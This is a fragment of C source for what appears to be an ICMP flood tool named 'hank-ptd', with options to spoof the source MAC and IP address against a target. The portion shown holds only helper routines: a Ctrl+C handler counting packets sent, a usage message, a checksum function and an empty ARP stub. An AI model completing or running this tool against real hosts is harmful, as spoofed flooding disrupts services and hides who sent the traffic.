
unsigned long long int flood_count = 1;

void terminate(int sig)
{
	char choice;

	printf("\r                                                                                   \n");
	printf("[\x1b[34m*\x1b[0m] 'ctrl+c' from user ...\n");
	printf("[\x1b[32m!\x1b[0m] pausing the program ...");
	printf("[ok]\n[\x1b[32m+\x1b[0m] total icmp packets sent = %lld\n\n",flood_count);
	while(1)
	{
		printf("\n[\x1b[34m?\x1b[0m] would you like to continue?[yY/nN] : ");
		scanf(" %c",&choice);
		if(choice == 'y' || choice == 'Y')
			break;

		else if(choice == 'n' || choice == 'N')
		{
			printf("[\x1b[34m*\x1b[0m] bye ...\n\n");
			signal(sig,SIG_IGN);
			exit(0);
		}
		else
			printf("[\x1b[31m-\x1b[0m] wrong choice ...\n");
	}
}

void usage(){

	printf("usage : hank-ptd -t [target_ip] -i [interface] [options]\n");
	printf("\nOPTIONS :\n");
	printf("\t-i [interface]\t\t- interface to send to\n\t-m [mac address]\t- spoof the source mac address\n");
	printf("\t-s [ip_addr]\t\t- spoof the source ip address\n\t-t [target]\t\t- target ip address or name\n\n");

}

int checksum(char *hdr,unsigned short int offset,unsigned short int protocol_hdr_len){

	int loop;
	unsigned int data;
	unsigned long sum=0;

	for(loop=offset;loop < (offset+protocol_hdr_len);loop+=2)
	{
		data = ((unsigned short)((hdr[loop])&(0x00ff))<<8) + (unsigned short)((hdr[loop+1])&(0x00ff));
		sum += data;
	}
	sum=(sum>>16)+(sum & 0xffff);
	sum=(~sum)&(0xffff);

	return (int)sum;
}

void arp(){

}

void exiting(){
	printf("[\x1b[34m*\x1b[0m] exiting ...\n\n");
	exit(0);
}
